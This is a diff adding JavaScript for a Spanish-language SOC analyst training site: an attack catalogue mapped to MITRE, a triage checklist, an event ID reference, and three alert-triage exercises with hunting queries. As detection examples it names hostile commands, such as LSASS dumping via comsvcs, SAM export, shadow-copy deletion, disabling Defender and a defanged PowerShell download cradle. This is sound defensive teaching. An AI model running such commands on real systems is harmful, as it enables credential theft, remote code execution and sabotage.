+  h:'Un programa legítimo de Windows haciendo algo que no le toca.',
+  ves:['powershell.exe con -enc, -nop, -w hidden o IEX','mshta.exe o rundll32.exe llamando a una URL','certutil.exe -urlcache -f bajando un archivo','wscript o cscript corriendo un .js/.vbs desde Descargas'],
+  rev:['Proceso padre y abuelo: ¿quién lo lanzó?','Decodifica el comando en CyberChef y léelo completo','¿Bajó algo? ¿A dónde se conectó?','Usuario y tipo de equipo'],
+  fp:['Scripts de TI firmados o desde rutas de despliegue','Agentes de SCCM, Intune o PDQ como padre','Instaladores conocidos'],
+  tp:['Padre es Office, navegador, correo o un .lnk','Ofuscación, ventana oculta, descarga de IP o dominio nuevo','Ejecución desde %AppData%, %Temp% o C:\\Users\\Public']},
+ {t:'Robo de credenciales',l:['EDR'],m:'T1003.001 · T1003.002',s:'crit',k:'lsass mimikatz procdump comsvcs minidump sam credential dump',
+  h:'Alguien intenta sacar contraseñas o hashes de la memoria o del registro.',
+  ves:['Acceso o volcado de lsass.exe','rundll32 comsvcs.dll MiniDump','procdump -ma lsass','reg save HKLM\\SAM o HKLM\\SECURITY','Mimikatz o variantes por nombre o comportamiento'],
+  rev:['Quién accedió a LSASS y desde qué ruta','Si se creó un archivo .dmp y a dónde fue','Qué hizo esa cuenta antes y después','Inicios de sesión nuevos de esa cuenta en otros equipos'],
+  fp:['Otros productos de seguridad legítimos','Soporte de Microsoft con caso abierto y autorizado'],
+  tp:['Todo lo demás, hasta que demuestres lo contrario'],
+  esc:'Escala siempre, aunque Falcon/Defender/Cortex lo haya bloqueado. Un intento de dump de LSASS significa que alguien ya está dentro con privilegios.'},
+ {t:'Persistencia',l:['EDR','SIEM'],m:'T1547.001 · T1053.005 · T1543.003',s:'high',k:'run key registro tarea programada scheduled task servicio service startup wmi 4698 7045',
+  h:'El atacante deja algo para volver a ejecutarse después de un reinicio.',
+  ves:['Valores nuevos en claves Run/RunOnce','Tareas programadas nuevas (4698)','Servicios nuevos (7045)','Archivos en la carpeta Inicio','Suscripciones WMI'],
+  rev:['Qué ejecuta la tarea, clave o servicio','Ruta y firma del binario','Quién lo creó y con qué proceso','Si se ejecutó y qué hizo'],
+  fp:['Actualizadores de Google, Adobe, Teams, Zoom','Software corporativo recién instalado'],
+  tp:['Binario en ruta de usuario o temporal','Nombres que imitan Windows (svch0st, winupdate32)','Tarea que llama a PowerShell oculto o a una URL']},
+ {t:'Movimiento lateral',l:['EDR','XDR','SIEM'],m:'T1021.002 · T1569.002 · T1047 · T1021.001',s:'high',k:'psexec psexesvc wmi wmiprvse winrm rdp smb lateral 4624 tipo 3 10',
+  h:'Desde un equipo comprometido, el atacante salta a otros.',
+  ves:['PSEXESVC.exe creado como servicio','WmiPrvSE.exe lanzando cmd o powershell','wsmprovhost.exe (WinRM) con hijos raros','RDP (logon tipo 10) entre estaciones de trabajo'],
+  rev:['Equipo origen y cuenta usada','A cuántos equipos llegó y en qué tiempo','Qué ejecutó en cada destino','Si coincide con ventana de cambios'],
+  fp:['Equipo de TI y servidores de despliegue','Cuentas de servicio de parches en su ventana'],
+  tp:['Cuenta de usuario normal haciendo admin remoto','Estación de trabajo a muchos destinos','Fuera de horario y después de un robo de credenciales']},
+ {t:'Comando y control (C2)',l:['EDR','SIEM'],m:'T1071 · T1105 · T1572',s:'high',k:'c2 beacon beaconing cobalt dns tunneling dominio nuevo conexión periódica',
+  h:'El malware llama a casa para recibir órdenes.',
+  ves:['Conexiones periódicas a un mismo destino (beaconing)','DNS con subdominios largos y raros','Procesos que no deberían salir a internet haciéndolo','Named pipes conocidos de frameworks de C2'],
+  rev:['Proceso que hace la conexión','Reputación y antigüedad del dominio/IP','Intervalo y volumen de conexiones','Logs de proxy o firewall en el SIEM'],
+  fp:['Agentes de monitoreo, backup, telemetría','Actualizadores de software'],
+  tp:['rundll32, notepad, regsvr32 hablando a internet','Dominio registrado hace días','IP de hosting barato o con mala reputación']},
+ {t:'Ransomware e impacto',l:['EDR','XDR'],m:'T1486 · T1490 · T1489',s:'crit',k:'ransomware vssadmin shadow copies wbadmin bcdedit cifrado nota rescate',
+  h:'Cifrado de archivos o sabotaje para que no puedas recuperarte.',
+  ves:['vssadmin delete shadows /all','wbadmin delete catalog','bcdedit /set recoveryenabled no','Cientos de archivos renombrados en minutos','Archivos README o notas de rescate'],
+  rev:['Cuántos equipos están afectados ahora','Cuenta y proceso que lo hace','Si hay movimiento lateral previo'],
+  fp:['Casi nunca. Algún admin limpiando backups, y aun así se confirma'],
+  tp:['Cualquier combinación de lo anterior'],
+  esc:'Prioridad máxima. Sigue el runbook de ransomware del cliente y avisa a nivel 2 de inmediato, por teléfono si hace falta.'},
+ {t:'Phishing y correo',l:['XDR','SIEM'],m:'T1566.001 · T1566.002',s:'med',k:'phishing correo email adjunto url zap spf dkim dmarc reportado',
+  h:'El correo sigue siendo la puerta de entrada más usada.',
+  ves:['Correos removidos después de entregados (ZAP)','Usuario reportó un correo','Clic en URL maliciosa','Adjunto detonado como malicioso'],
+  rev:['Remitente real y encabezados (SPF, DKIM, DMARC)','URL en urlscan, adjunto por hash','Quién más recibió el mismo correo','Quién hizo clic o abrió el adjunto'],
+  fp:['Campañas de marketing','Simulaciones de phishing internas'],
+  tp:['Dominio que imita al cliente o a un proveedor','Pide credenciales, pagos o cambiar cuentas bancarias','Clic seguido de inicio de sesión raro']},
+ {t:'Identidad y cuentas',l:['XDR','SIEM'],m:'T1110.003 · T1621 · T1078',s:'high',k:'mfa fatigue impossible travel password spray entra azure ad sign-in 500121 tor anonymous',
+  h:'Ya no rompen la puerta: entran con tu llave.',
+  ves:['Viaje imposible o propiedades de inicio inusuales','Muchos intentos fallidos desde una IP a muchas cuentas (spray)','Bombardeo de MFA','Inicio desde TOR, VPN anónima o hosting','Nuevo método MFA registrado'],
+  rev:['IP, país, ISP y user agent','Si hubo éxito después de fallos','Qué hizo la sesión: correo, archivos, reglas','Otras cuentas tocadas desde la misma IP'],
+  fp:['VPN corporativa','Viajes reales, datos móviles','Apps de sincronización'],
+  tp:['Éxito tras rechazos de MFA','Regla de bandeja nueva justo después','Registro de MFA nuevo desde la IP sospechosa']},
+ {t:'Evasión de defensas',l:['EDR','SIEM'],m:'T1562.001 · T1070.001',s:'crit',k:'evasion defender disable tamper 1102 borrado log exclusion set-mppreference',
+  h:'Antes de hacer ruido, apagan la alarma.',
+  ves:['Borrado del log de seguridad (1102)','Set-MpPreference -DisableRealtimeMonitoring','Exclusiones nuevas de antivirus','Intentos de desinstalar o detener el EDR'],
+  rev:['Qué pasó 30 minutos antes y después','Cuenta usada','Si hay otras alertas en ese equipo'],
+  fp:['Troubleshooting de TI documentado con ticket'],
+  tp:['Casi siempre acompaña algo más grave'],
+  esc:'Escala. Si alguien apagó la defensa, lo importante es lo que vino después.'},
+ {t:'Reconocimiento',l:['EDR','SIEM'],m:'T1087 · T1018 · T1482',s:'med',k:'whoami net group domain admins nltest adfind bloodhound sharphound discovery escaneo',
+  h:'El atacante se orienta: quién es, dónde está, quién manda.',
+  ves:['whoami /all, net group "domain admins" /domain','nltest /domain_trusts','AdFind, SharpHound/BloodHound','Escaneo de puertos interno'],
+  rev:['Cuántos comandos y en cuánto tiempo','Quién los corrió y desde qué proceso','Qué vino después'],
+  fp:['Admins y scripts de inventario'],
+  tp:['Ráfaga de comandos en pocos minutos desde un usuario que no es de TI','Lanzados desde un proceso que no es una consola normal']},
+ {t:'Exfiltración',l:['SIEM','XDR'],m:'T1567.002 · T1048 · T1560',s:'high',k:'exfil rclone mega subida upload 7z rar compresión dropbox',
+  h:'Sacar información antes de cifrar o para extorsionar.',
+  ves:['rclone o herramientas de sync a la nube','Subidas grandes a Mega, Dropbox o almacenamiento desconocido','Compresión de carpetas completas con 7z o rar','Picos de tráfico de salida en firewall o proxy'],
+  rev:['Volumen y destino','Qué carpetas se comprimieron','Horario y cuenta'],
+  fp:['Backups y OneDrive/SharePoint corporativo'],
+  tp:['rclone en un equipo que no es de TI','Compresión seguida de subida a servicio externo','Madrugada o fin de semana']}
+];
+const sevName={crit:'Crítica',high:'Alta',med:'Media',low:'Baja'};
+const attackLabs={
+ 'Ejecución sospechosa y LOLBins':['Sysmon','CyberChef: The Basics'],
+ 'Robo de credenciales':['Sysmon','EVTX-ATTACK-SAMPLES'],
+ 'Persistencia':['Windows Event Logs','EVTX-ATTACK-SAMPLES'],
+ 'Movimiento lateral':['PsExec Hunt','EVTX-ATTACK-SAMPLES'],
+ 'Comando y control (C2)':['Threat Intelligence Tools','Boss of the SOC v3'],
+ 'Ransomware e impacto':['Labs de ransomware'],
+ 'Phishing y correo':['Phishing Analysis Fundamentals','Threat Intelligence Tools'],
+ 'Identidad y cuentas':['Kusto Detective Agency','Sentinel skill-up y Training Lab'],
+ 'Evasión de defensas':['EVTX-ATTACK-SAMPLES','Atomic Red Team'],
+ 'Reconocimiento':['Atomic Red Team','Security Datasets'],
+ 'Exfiltración':['Boss of the SOC v3']
+};
+const practiceRow=names=>names&&names.length?`<p class="practice"><span>Practica esto</span>${names.map(n=>{const x=labBy(n);return x?`<a href="${x.u}" target="_blank" rel="noopener">${esc(x.p)} · ${esc(x.t)}</a>`:''}).join('')}</p>`:'';
+let aFilter='all';
+function renderAttacks(){
+  const q=($('#asearch').value||'').toLowerCase().trim();
+  const list=attacks.filter(a=>(aFilter==='all'||a.l.includes(aFilter))&&(!q||(a.t+' '+a.k+' '+a.m+' '+a.h).toLowerCase().includes(q)));
+  $('#attacks').innerHTML=list.length?list.map(a=>`
+   <details class="attack">
+    <summary>
+      <h3>${esc(a.t)}</h3>
+      <div class="meta"><span class="sev ${a.s}">${sevName[a.s]}</span><div class="layers-t">${a.l.map(x=>`<span>${x}</span>`).join('')}</div><span class="mitre">${esc(a.m)}</span></div>
+      <p class="hook">${esc(a.h)}</p>
+    </summary>
+    <div class="body">
+      <div><h4>Cómo se ve</h4><ul>${a.ves.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      <div><h4>Qué revisar</h4><ul>${a.rev.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      <div class="fp"><h4>Huele a falso positivo</h4><ul>${a.fp.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      <div class="tp"><h4>Huele a ataque</h4><ul>${a.tp.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      ${a.esc?`<p class="escala"><b>Escala.</b> ${esc(a.esc)}</p>`:''}
+      ${practiceRow(attackLabs[a.t])}
+    </div>
+   </details>`).join(''):'<p class="empty">Nada con ese filtro. Prueba otra palabra.</p>';
+}
+document.querySelectorAll('.filter').forEach(b=>b.addEventListener('click',()=>{
+  aFilter=b.dataset.f;document.querySelectorAll('.filter').forEach(x=>x.setAttribute('aria-pressed',x===b));renderAttacks();}));
+$('#asearch').addEventListener('input',renderAttacks);
+renderAttacks();
+document.querySelector('#attacks details')?.setAttribute('open','');
+
+/* ---------- TRIAGE ---------- */
+const steps=[
+ {t:'Lee la alerta completa',w:'Nombre, severidad, host, usuario, hora y, sobre todo, qué acción tomó la herramienta. Anota la hora en una sola zona horaria.',b:'Quedarte con el título y saltar directo a VirusTotal.'},
+ {t:'Pon contexto',w:'¿Es laptop o servidor? ¿Activo crítico? ¿El usuario es de TI, desarrollo o un área de negocio? ¿Hay ventana de cambio o aviso del cliente?',b:'Tratar igual un controlador de dominio que una laptop de prácticas.'},
+ {t:'Lee el árbol de procesos',w:'Padre, abuelo e hijos. Pregúntate si la cadena tiene sentido: Outlook → Word → PowerShell no tiene sentido para una factura.',b:'Mirar solo el proceso que disparó y no lo que vino antes o después.'},
+ {t:'Saca y verifica indicadores',w:'Hash, IP, dominio, URL, ruta. Revisa reputación, antigüedad del dominio y si el binario está firmado. Decodifica comandos.',b:'Concluir "limpio" porque VirusTotal da 0/70. Un malware nuevo también da 0.'},
+ {t:'Mide el alcance',w:'Busca el mismo hash, dominio, comando o cuenta en toda la flota. ¿Es un equipo o son veinte? ¿Un usuario o varios?',b:'Cerrar el caso del equipo 1 sin ver que el equipo 2 tiene lo mismo.'},
+ {t:'Decide y documenta',w:'Verdadero positivo, TP benigno o falso positivo. Escribe la evidencia que lo sostiene, qué hiciste y a quién escalaste.',b:'Notas como "revisado, sin hallazgos".'}
+];
+const done=store('tc_steps')||[];
+function renderSteps(){
+  $('#steps').innerHTML=steps.map((s,i)=>`
+   <div class="step ${done[i]?'done':''}">
+     <span class="n">${i+1}</span>
+     <label><input type="checkbox" id="st${i}" ${done[i]?'checked':''} data-i="${i}"><h3>${esc(s.t)}</h3></label>
+     <p class="why">${esc(s.w)}</p>
+     <p class="bad"><b>Error típico:</b> ${esc(s.b)}</p>
+   </div>`).join('');
+}
+$('#steps').addEventListener('change',e=>{const i=+e.target.dataset.i;done[i]=e.target.checked;store('tc_steps',done);e.target.closest('.step').classList.toggle('done',e.target.checked)});
+$('#resetSteps').addEventListener('click',()=>{done.length=0;store('tc_steps',[]);renderSteps()});
+renderSteps();
+
+/* ---------- EVENTOS ---------- */
+const events=[
+ ['g','Windows Security'],
+ ['4624','Security','Inicio de sesión exitoso','Revisa el tipo de logon y desde dónde. Tipo 3 y 10 entre estaciones son clásicos de movimiento lateral.'],
+ ['4625','Security','Inicio de sesión fallido','Muchos seguidos: fuerza bruta o spray. Fíjate en el código de estado.'],
+ ['4648','Security','Logon con credenciales explícitas','runas o herramientas que usan otra cuenta. Útil en movimiento lateral.'],
+ ['4672','Security','Privilegios especiales asignados','La cuenta entró con derechos de admin. Ojo si no es una cuenta de TI.'],
+ ['4688','Security','Proceso creado','Si la auditoría de línea de comandos está activa, ves el comando completo.'],
+ ['4697 / 7045','Security / System','Servicio instalado','PsExec y mucho malware crean servicios. Revisa la ruta del binario.'],
+ ['4698','Security','Tarea programada creada','Persistencia muy común. Lee qué ejecuta.'],
+ ['4720','Security','Cuenta de usuario creada','Si nadie la pidió, es una alerta.'],
+ ['4728 / 4732 / 4756','Security','Miembro agregado a un grupo','Sobre todo a Domain Admins o Administradores locales.'],
+ ['4740','Security','Cuenta bloqueada','Puede ser un usuario que olvidó su contraseña o un ataque de fuerza bruta.'],
+ ['4768 / 4769','Security','Ticket Kerberos TGT / TGS','4769 con cifrado RC4 (0x17) hacia muchos servicios suele ser Kerberoasting.'],
+ ['4776','Security','Validación NTLM','Útil para ver de dónde vienen intentos con NTLM.'],
+ ['1102','Security','Log de auditoría borrado','Casi nunca es inocente. Escala.'],
+ ['4104','PowerShell/Operational','Script block logging','Ves el script real de PowerShell ya decodificado.'],
+ ['g','Sysmon (si el cliente lo tiene)'],
+ ['1','Sysmon','Creación de proceso','Con hash y línea de comandos completa.'],
+ ['3','Sysmon','Conexión de red','Qué proceso se conectó a dónde.'],
+ ['10','Sysmon','Acceso a otro proceso','Aquí ves quién tocó la memoria de LSASS.'],
+ ['11','Sysmon','Archivo creado','Para ver qué se escribió en disco.'],
+ ['13','Sysmon','Valor de registro modificado','Persistencia en claves Run.'],
+ ['22','Sysmon','Consulta DNS','Qué proceso resolvió qué dominio.'],
+ ['g','Entra ID · SigninLogs (ResultType)'],
+ ['0','SigninLogs','Inicio de sesión exitoso','El que importa después de una serie de fallos.'],
+ ['50126','SigninLogs','Usuario o contraseña inválidos','Muchos desde una IP a varias cuentas: password spray.'],
+ ['50053','SigninLogs','Cuenta bloqueada o IP bloqueada por intentos','Smart lockout. Señal de ataque de fuerza bruta.'],
+ ['50074','SigninLogs','Se requiere MFA','La contraseña fue correcta y se pidió segundo factor.'],
+ ['500121','SigninLogs','Falló la autenticación fuerte','Muchos seguidos: el usuario está rechazando o ignorando pushes de MFA.'],
+ ['g','Telemetría de EDR'],
+ ['ProcessRollup2','Falcon','Proceso iniciado','El evento base para casi cualquier búsqueda en Falcon.'],
+ ['DnsRequest / NetworkConnectIP4','Falcon','DNS y conexiones','Para seguir a dónde habló un proceso.'],
+ ['AsepValueUpdate','Falcon','Cambio en ubicación de autoarranque','Persistencia en registro.'],
+ ['DeviceProcessEvents','Defender','Procesos','La tabla que más vas a consultar en Advanced hunting.'],
+ ['DeviceNetworkEvents','Defender','Conexiones de red','Junto con RemoteUrl y RemoteIP.'],
+ ['ENUM.PROCESS / ENUM.NETWORK','Cortex','Tipos de evento en xdr_data','Filtras por event_type para procesos o red.']
+];
+function renderEvents(){
+  const q=($('#esearch').value||'').toLowerCase().trim();
+  let out='',pending='';
+  events.forEach(e=>{
+    if(e[0]==='g'){pending=`<tr class="grp"><td colspan="4">${esc(e[1])}</td></tr>`;return}
+    if(q&&!e.join(' ').toLowerCase().includes(q))return;
+    out+=pending+`<tr><td class="id">${esc(e[0])}</td><td class="src">${esc(e[1])}</td><td>${esc(e[2])}</td><td>${esc(e[3])}</td></tr>`;pending='';
+  });
+  $('#etable').innerHTML=out||'<tr><td colspan="4" class="empty">Sin resultados.</td></tr>';
+}
+$('#esearch').addEventListener('input',renderEvents);renderEvents();
+
+/* ---------- CASOS ---------- */
+const cases=[
+ {id:'c1',title:'La factura que abrió PowerShell',console:'Falcon · EDR',sev:'high',
+  intro:'Lunes, 09:42. Falcon levanta "Suspicious PowerShell execution" en una laptop de Contabilidad. La política del equipo está en modo detección, así que nada se bloqueó.',
+  facts:[['Host','LAP-CONTAB-014'],['Usuario','mgarcia (Contabilidad)'],['Severidad','High'],['MITRE','T1059.001'],['Acción','Detected']],
+  tl:[['09:41','Llega correo "CFDI pendiente septiembre" con adjunto <code>Factura_0923.docm</code>'],['09:42','<code>OUTLOOK.EXE → WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA…</code>'],['09:42','Decodificado: <code>IEX (New-Object Net.WebClient).DownloadString(\'hxxp://203.0.113[.]45/a.ps1\')</code>'],['09:42','DnsRequest a <code>cfdi-validacion[.]top</code>, dominio registrado hace 4 días'],['09:43','NewExecutableWritten: <code>C:\\Users\\mgarcia\\AppData\\Roaming\\upd\\updsvc.exe</code> (sin firma)'],['09:43','AsepValueUpdate: <code>HKCU\\…\\CurrentVersion\\Run\\Updater</code> apunta a updsvc.exe']],
+  opts:[['fp','Falso positivo: es una macro de Contabilidad'],['tpb','TP benigno: alguna herramienta de facturación'],['tp','Verdadero positivo: escalar y contener']],
+  ans:'tp',
+  why:'La cadena completa cuenta la historia: un adjunto de Word lanza PowerShell oculto y codificado, descarga un script de una IP sin reputación, escribe un ejecutable sin firma en AppData y lo deja en una clave Run para sobrevivir al reinicio. Ninguna herramienta legítima de facturación hace eso.',
+  wrong:{fp:'Revisa otra vez qué hizo PowerShell después. Una macro legítima no baja ejecutables de una IP ni crea persistencia.',tpb:'Para ser TP benigno tendría que estar autorizado. ¿Qué herramienta de facturación se conecta a un dominio de 4 días y se esconde en AppData?'},
+  next:['Escalar a nivel 2 y solicitar contención del host según el runbook del cliente','Buscar el hash de updsvc.exe y el dominio en toda la flota','Buscar el mismo correo en otros buzones y pedir que se purgue','Revisar si mgarcia escribió credenciales en algún sitio y si hubo inicios de sesión raros después','Bloquear IP, dominio y hash como IOC'],
+  learn:['Office creando procesos de scripting es de las señales más confiables que hay','Decodificar el Base64 cambia por completo el caso','La persistencia te dice que el atacante pensaba quedarse'],
+  queries:[['CQL','// ¿Algún otro equipo resolvió el dominio?\n#event_simpleName=DnsRequest DomainName="cfdi-validacion.top"\n| groupBy([ComputerName, UserName])'],['CQL','// ¿Dónde más apareció el binario? (pega el SHA256)\n#event_simpleName=ProcessRollup2 SHA256HashData="<SHA256_de_updsvc.exe>"\n| groupBy([ComputerName])']]},
+ {id:'c2',title:'PsExec en 40 servidores a las 2 am',console:'Cortex XDR · EDR',sev:'med',
+  intro:'Sábado, 02:05. Entran 40 alertas BIOC de "Remote service creation / PsExec" en servidores de un mismo cliente en 35 minutos. Se ve feo.',
+  facts:[['Cuenta','CORP\\svc_patching'],['Origen','SRV-DEPLOY-01'],['Alertas','40, severidad Medium'],['Acción','Detected'],['Ventana','02:05 a 02:40']],
+  tl:[['02:05','En cada servidor: <code>services.exe → PSEXESVC.exe</code>, binario firmado por Microsoft (Sysinternals)'],['02:05','<code>PSEXESVC.exe → cmd.exe /c \\\\SRV-DEPLOY-01\\Parches$\\2026-10\\install.cmd</code>'],['02:06','install.cmd lanza <code>wusa.exe</code> con paquetes .msu desde el mismo share'],['02:40','Los servidores reinician. No hay conexiones a internet desde la cadena'],['Ticket','El cliente tiene el cambio CHG-20431: parchado de servidores sábado 01:00 a 05:00 con svc_patching desde SRV-DEPLOY-01']],
+  opts:[['tp','Verdadero positivo: movimiento lateral masivo'],['tpb','TP benigno: actividad autorizada'],['fp','Falso positivo: la regla se equivocó']],
+  ans:'tpb',
+  why:'La regla acertó: sí hubo ejecución remota con PsExec. Pero todo coincide con el cambio aprobado: la cuenta, el servidor de origen, el horario, el share de parches y lo que se ejecutó. No hay hijos raros ni salida a internet. Es actividad legítima y autorizada, por eso es TP benigno y no falso positivo.',
+  wrong:{tp:'Revisa el contexto: cuenta, origen, horario y ticket coinciden. ¿Hay algún hijo raro o conexión externa? Sin eso, no hay evidencia de ataque.',fp:'Cuidado con la diferencia: la regla no se equivocó, PsExec sí se usó. Lo que lo hace benigno es que estaba autorizado.'},
+  next:['Cerrar como TP benigno citando CHG-20431 y la evidencia revisada','Proponer a nivel 2 un tuning acotado: svc_patching + SRV-DEPLOY-01 + ruta del share, solo en la ventana','Nunca excluir PsExec de forma global'],
+  learn:['Qué te haría cambiar de opinión: svc_patching usada desde otro host, fuera de la ventana, o hijos como whoami, net o rundll32','Mucho volumen no es igual a mucha gravedad','El ticket se cita con número, no "TI dijo que sí"'],
+  queries:[['XQL','// Qué ejecutó PsExec en cada servidor\ndataset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter lowercase(actor_process_image_name) = "psexesvc.exe"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_name, action_process_image_command_line\n| sort asc _time'],['XQL','// ¿Desde qué equipos se usó la cuenta de parches?\ndataset = xdr_data\n| filter event_type = ENUM.PROCESS and actor_effective_username contains "svc_patching"\n| comp count() as eventos by agent_hostname']]},
+ {id:'c3',title:'El usuario que aprobó el MFA a las 3 am',console:'Defender XDR + Sentinel · XDR/SIEM',sev:'high',
+  intro:'Martes, 03:20. Defender XDR abre un incidente que junta "Atypical travel" de Entra ID Protection y "Suspicious inbox forwarding rule" de Defender for Cloud Apps.',
+  facts:[['Usuario','jlopez@cliente.mx (Compras)'],['Último inicio normal','18:40 del lunes, Puebla, ISP local'],['IP nueva','198.51.100.77 (hosting VPS, Países Bajos)'],['Severidad','High']],
+  tl:[['03:02','Desde 198.51.100.77: contraseña correcta, se pide MFA (50074)'],['03:02–03:14','14 rechazos de MFA (500121)'],['03:15','Inicio exitoso (ResultType 0) desde la misma IP'],['03:21','Regla de bandeja nueva llamada "." que mueve correos con "factura" o "pago" a Fuentes RSS y los reenvía a una cuenta externa'],['03:30','Se registra un nuevo método de autenticación en la cuenta']],
+  opts:[['fp','Falso positivo: el usuario estaba de viaje'],['tpb','TP benigno: usó una VPN personal'],['tp','Verdadero positivo: cuenta comprometida']],
+  ans:'tp',
+  why:'La contraseña ya estaba en manos del atacante, que bombardeó el MFA hasta que el usuario aceptó uno por cansancio. Lo que hizo después lo confirma: regla para esconder y reenviar correos de pagos (preparación de fraude BEC) y un método MFA propio para volver a entrar.',
+  wrong:{fp:'Aunque estuviera de viaje, ¿por qué rechazaría 14 veces su propio MFA? ¿Y por qué crearía una regla que esconde correos de pagos?',tpb:'Una VPN personal explicaría la IP, pero no los 14 rechazos de MFA ni la regla de reenvío ni el nuevo método MFA.'},
+  next:['Escalar de inmediato. Revocar sesiones, forzar cambio de contraseña y eliminar el método MFA nuevo (según runbook)','Borrar la regla de bandeja y revisar correos enviados desde la cuenta','Avisar al cliente: posible fraude con proveedores','Buscar la IP 198.51.100.77 en otras cuentas del tenant'],
+  learn:['En identidad, lo que importa es lo que pasó después del login','Varios rechazos de MFA seguidos de una aprobación es una señal de alarma','El XDR juntó dos alertas que solas parecían menores'],
+  queries:[['KQL','// Línea de tiempo de inicios de sesión del usuario\nSigninLogs\n| where TimeGenerated > ago(24h)\n| where UserPrincipalName =~ "jlopez@cliente.mx"\n| project TimeGenerated, IPAddress, Location, ResultType, ResultDescription, AppDisplayName\n| order by TimeGenerated asc'],['KQL','// ¿Qué otras cuentas tocó la misma IP?\nSigninLogs\n| where TimeGenerated > ago(7d)\n| where IPAddress == "198.51.100.77"\n| summarize intentos = count(), exitos = countif(ResultType == "0") by UserPrincipalName'],['KQL','// Reglas de bandeja creadas o modificadas\nOfficeActivity\n| where TimeGenerated > ago(7d)\n| where Operation in ("New-InboxRule", "Set-InboxRule")\n| where UserId =~ "jlopez@cliente.mx"\n| project TimeGenerated, ClientIP, Operation, Parameters']]}
+];
+const caseLabs={c1:['Sysmon','CyberChef: The Basics'],c2:['PsExec Hunt'],c3:['Kusto Detective Agency','Sentinel skill-up y Training Lab']};
+const ansLabel={tp:'Verdadero positivo',tpb:'TP benigno',fp:'Falso positivo'};
+function renderCases(){
+  const saved=store('tc_cases')||{};
+  $('#cases').innerHTML=cases.map(c=>`
+  <article class="case" id="${c.id}">
+   <div class="case-top"><div><p class="eyebrow">Caso ${c.id.slice(1)}</p><h3>${esc(c.title)}</h3></div><div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><span class="sev ${c.sev}">${sevName[c.sev]}</span><span class="console-name">${esc(c.console)}</span></div></div>
+   <div class="case-grid">
+     <div><p>${esc(c.intro)}</p><dl class="kv" style="margin-top:14px">${c.facts.map(f=>`<dt>${esc(f[0])}</dt><dd>${esc(f[1])}</dd>`).join('')}</dl></div>
+     <div><p class="eyebrow" style="margin-bottom:10px">Evidencia</p><ol class="timeline">${c.tl.map(t=>`<li><time>${esc(t[0])}</time><span>${t[1]}</span></li>`).join('')}</ol></div>
+   </div>
+   <div class="ask"><p class="qq">¿Cuál es tu veredicto?</p>
+     <div class="opts">${c.opts.map(o=>`<button class="opt" data-case="${c.id}" data-v="${o[0]}">${esc(o[1])}</button>`).join('')}</div>
+     <div class="feedback" aria-live="polite"></div>
+   </div>
+   <div class="reveal" hidden>
+     <div><h4>Por qué es ${esc(ansLabel[c.ans])}</h4><p class="prose">${esc(c.why)}</p></div>
+     <div class="cols">
+       <div><h4>Qué sigue</h4><ol>${c.next.map(x=>`<li>${esc(x)}</li>`).join('')}</ol></div>
+       <div><h4>Para que te quede</h4><ul>${c.learn.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+     </div>
+     <div><h4>Consultas</h4>${c.queries.map(q=>codeBlock(q[0],q[1])).join('')}</div>
+     ${practiceRow(caseLabs[c.id])}
+   </div>
+  </article>`).join('');
+  Object.entries(saved).forEach(([id,v])=>answer(id,v,true));
+}
+function answer(id,v,silent){
+  const c=cases.find(x=>x.id===id),el=document.getElementById(id);
+  el.querySelectorAll('.opt').forEach(b=>{b.classList.remove('right','wrong');
+    if(b.dataset.v===c.ans&&v===c.ans)b.classList.add('right');
+    if(b.dataset.v===v&&v!==c.ans)b.classList.add('wrong');});
+  const fb=el.querySelector('.feedback'),rv=el.querySelector('.reveal');
+  if(v===c.ans){fb.innerHTML=`<p class="verdict-line" style="color:var(--ok)">Correcto: ${esc(ansLabel[c.ans])}.</p>`;rv.hidden=false;}
+  else{fb.innerHTML=`<p class="verdict-line" style="color:var(--crit)">Todavía no.</p><p>${esc(c.wrong[v])}</p><button class="btn" data-show="${id}" style="margin-top:10px">Ver la respuesta</button>`;rv.hidden=true;}
+  if(!silent){const s=store('tc_cases')||{};s[id]=v;store('tc_cases',s)}
+}
+$('#cases').addEventListener('click',e=>{
+  const o=e.target.closest('.opt');if(o)return answer(o.dataset.case,o.dataset.v);
+  const s=e.target.closest('[data-show]');if(s){const el=document.getElementById(s.dataset.show);el.querySelector('.reveal').hidden=false;s.remove()}
+});
+renderCases();
+
+/* ---------- HERRAMIENTAS ---------- */
+const tools=[
+ {g:'Reputación de IPs, dominios y hashes',i:[['VirusTotal','https://www.virustotal.com','Busca hash, IP, dominio o URL. Revisa también la pestaña de relaciones y la fecha de primera vista.'],['AbuseIPDB','https://www.abuseipdb.com','Reportes de abuso por IP: escaneos, fuerza bruta, spam.'],['GreyNoise','https://viz.greynoise.io','Te dice si una IP es ruido de internet (escáneres masivos) o algo dirigido.'],['Cisco Talos Intelligence','https://talosintelligence.com','Reputación de IP y dominio, y categoría web.'],['AlienVault OTX','https://otx.alienvault.com','Pulses de la comunidad con indicadores relacionados.'],['Shodan','https://www.shodan.io','Qué servicios expone una IP. Útil para identificar infraestructura de C2.']]},
+ {g:'URLs, correo y dominios',i:[['urlscan.io','https://urlscan.io','Visita la URL por ti y te muestra captura, redirecciones y peticiones. Usa escaneo privado o no listado con URLs del cliente.'],['URLhaus','https://urlhaus.abuse.ch','Base de URLs que distribuyen malware.'],['ThreatFox','https://threatfox.abuse.ch','IOCs de C2 y malware compartidos por la comunidad.'],['MXToolbox Header Analyzer','https://mxtoolbox.com/EmailHeaders.aspx','Lee encabezados de correo, SPF, DKIM y saltos.'],['who.is','https://who.is','Fecha de registro de un dominio. Un dominio de días es sospechoso.']]},
+ {g:'Archivos y sandbox',i:[['MalwareBazaar','https://bazaar.abuse.ch','Busca por hash y ve a qué familia pertenece.'],['Hybrid Analysis','https://www.hybrid-analysis.com','Reportes de sandbox públicos. Busca primero por hash.'],['ANY.RUN','https://any.run','Sandbox interactivo. En la versión gratuita todo lo que subes es público.'],['Triage','https://tria.ge','Sandbox con buena extracción de configuración de malware.']]},
